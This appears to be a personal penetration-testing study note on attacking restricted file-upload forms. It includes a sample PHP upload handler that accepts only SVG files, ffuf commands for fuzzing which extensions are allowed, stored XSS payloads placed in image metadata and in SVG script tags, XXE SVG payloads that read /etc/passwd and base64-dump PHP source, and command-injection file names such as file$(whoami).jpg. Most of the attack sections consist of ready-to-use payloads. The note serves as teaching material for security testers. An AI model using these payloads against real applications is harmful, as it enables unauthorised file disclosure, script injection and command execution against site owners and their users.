###### PRIMARY CATEGORY → [[FILE UPLOAD]]

#### *Theory*

There are situations where the upload feature of a given web application is properly secured and therefore is not vulnerable to file upload bypasses we have seen

However, even if we are dealing with such an upload form, which only allows us to upload specific file types, we may still be able to perform certain attacks

Certain files such as *SVG*, *HTML* or *XML* may allow us to introduce some vulnerabilities to the web application by uploading malicious versions of these files

##### *Code*

> [!DANGER]- *Code*
>
> ```php
> <?php
> $target_dir = "./images/";
> $fileName = basename($_FILES["uploadFile"]["name"]);
> $target_file = $target_dir . $fileName;
> $contentType = $_FILES['uploadFile']['type'];
> $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
> 
> if (!preg_match('/^.*\.svg$/', $fileName)) {
>     echo "Only SVG images are allowed";
>     die();
> }
> 
> foreach (array($contentType, $MIMEtype) as $type) {
>     if (!in_array($type, array('image/svg+xml'))) {
>         echo "Only SVG images are allowed";
>         die();
>     }
> }
> 
> if ($_FILES["uploadFile"]["size"] > 500000) {
>     echo "File too large";
>     die();
> }
> 
> if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
>     $latest = fopen($target_dir . "latest.xml", "w");
>     fwrite($latest, basename($_FILES["uploadFile"]["name"]));
>     fclose($latest);
>     echo "File successfully uploaded";
> } else {
>     echo "File failed to upload";

#### *Fuzzing for allowed extensions*

First, we should validate which extension are allowed by the given form

To do so, we need a tool, such as ***[Ffuf](https://github.com/ffuf/ffuf)*** and a set of wordlist for the most common web extensions

##### *Wordlists*

***[Common Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[Common Web Extensions: BIG](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions-big.txt)***

##### *Fuzzing*

Bear in mind that we need the raw *POST HTTP* request related to the upload to pass it to *Ffuf* along with one of the wordlists above

```bash
ffuf -v -t <THREADS> -request <REQUEST_FILE> -request-proto <REQUEST_PROTOCOL> -w <WORDLIST>
```

---

#### *XSS*

> ***Stored XSS***

##### *HTML*

As is commonly known, we can include *Javascript* code within an *HTML* file through either an *\<script\>*  tag or *event handlers* as attributes within an *HTML* tag

Therefore, if an upload feature of a given web application allows us to upload an *HTML* file, once the latter is requested and  rendered from the browser, all the *js* code will be evaluated, thereby being able to carry out attacks such as *XSS* or *CSRF*

##### *Image Metadata*

If a web application displays the metadata of an image uploaded somewhere, we can include an *XSS* payload in one of the metadata parameters that accept raw text, such as *Comment* or *Artist*

```bash
exiftool -Comment='test"><img src=x onerror=alert(location.origin)>'
```

As stated, when the metadata is displayed in the web application, the *js* payload will be triggered

Furthermore, we can try to modify the *MIME* type of the uploaded file to *text/html* as some web applications may show it as an *HTML* documents rather than an image, thereby triggering the *XSS* payload even if the metadata is not displayed

##### *SVG*

Remember that *SVG* images are *XML-based*, so an operator could include *JS* code within the given file, which would be evaluated once the image is rendered by the browser

So, we can modify its *XML* data to include an *XSS* payload, as follows

```bash /script/
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(location.origin);</script>
</svg>
```

Again, once we upload the *SVG* image, the payload will be triggered whenever the former is displayed

---

#### *XXE*

##### *SVG*

Similarly to *XSS*, we can leverage *SVG* images to introduce web vulnerabilities into a given web application as long as it allows upload this image type

In this case, we can carry out a *Local File Disclosure* by injecting arbitrary *XML* entities within the *SVG* images

To do so, an operator could use the *SYSTEM*

```bash /SYSTEM/
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Once the *SVG* image is rendered somewhere, our defined entity will load the specified file

Furthermore, it is recommended to list the content of web application files, such as *PHP* scripts, as we can potentially discover new vulnerabilities or security flaws by analyzing the source code of the entire web application

To do this, we can leverage the ***[[LFI - PHP FILTERS#Input Filters|PHP Input filter]]*** called *convert* in order to get the source code in *base64* and then decode it locally

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Again, once the *SVG* is displayed, we should get the *base64* content of the specified file

This method is not only limited to *SVG* files, other file types, such as *PDFs*, *Word* documents and so on, contains *XML* data within them, so we may modify it to include the malicious *XML* entity and achieve a blind *XXE*

---

#### *Command Injection*

##### *Injection in File Name*

There are situations where a web application may take the uploaded file's name and pass it to a system command to carry out certain actions

If so, we can try to add a system command to the file name before upload it

```bash
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

Once the provided file name is passed to a function such as *system()* or *shell_exec()*, the command will be injected and executed
